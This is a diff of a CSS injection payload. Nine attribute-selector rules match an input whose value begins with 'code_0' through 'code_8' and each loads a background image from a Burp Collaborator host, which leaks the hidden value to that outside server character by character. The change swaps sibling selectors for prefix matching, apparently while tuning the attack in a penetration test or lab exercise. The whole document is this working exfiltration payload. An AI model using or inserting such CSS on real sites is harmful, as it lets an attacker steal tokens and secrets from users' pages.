@@ -1,9 +1,1 @@
-input[value*="code_0"]~{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/0");}
-input[value*="code_1"]~{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/1");}
-input[value*="code_2"]~{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/2");}
-input[value*="code_3"]~{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/3");}
-input[value*="code_4"]~{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/4");}
-input[value*="code_5"]~{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/5");}
-input[value*="code_6"]~{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/6");}
-input[value*="code_7"]~{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/7");}
-input[value*="code_8"]~{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/8");}
+input[value^="code_0"]{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/0");}input[value^="code_1"]{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/1");}input[value^="code_2"]{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/2");}input[value^="code_3"]{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/3");}input[value^="code_4"]{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/4");}input[value^="code_5"]{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/5");}input[value^="code_6"]{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/6");}input[value^="code_7"]{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/7");}input[value^="code_8"]{background:url("https://phafnmtrbp54ner9nvsyadolocu9iy.burpcollaborator.net/8");}
